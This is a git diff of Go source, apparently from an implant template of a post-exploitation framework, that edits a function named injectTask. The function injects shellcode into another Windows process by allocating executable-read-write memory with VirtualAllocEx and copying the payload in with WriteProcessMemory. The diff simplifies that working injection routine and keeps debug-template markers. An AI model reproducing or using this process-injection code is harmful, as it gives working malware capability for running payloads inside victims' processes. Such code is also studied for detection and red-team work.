@@ -151,23 +151,11 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 
 	// Create native buffer with the shellcode
 	dataSize := len(data)
-	// {{if .Debug}}
-	log.Println("creating native data buffer ...")
-	// {{end}}
-	dataAddr, _, err := procVirtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
-	if dataAddr == 0 {
-		return err
-	}
-	dataBuf := (*[9999999]byte)(unsafe.Pointer(dataAddr))
-	for index, value := range data {
-		dataBuf[index] = value
-	}
-
 	// Remotely allocate memory in the target process
 	// {{if .Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
-	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
+	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
 	// {{if .Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
@@ -179,7 +167,7 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	}
 
 	// Write the shellcode into the remotely allocated buffer
-	_, err = writeProcessMemory(processHandle, remoteAddr, unsafe.Pointer(dataAddr), uint32(dataSize))
+	_, err = writeProcessMemory(processHandle, remoteAddr, unsafe.Pointer(&data[0]), uint32(dataSize))
 	// {{if .Debug}}
 	log.Printf("writeprocessmemory returned: err = %v", err)
 	// {{end}}
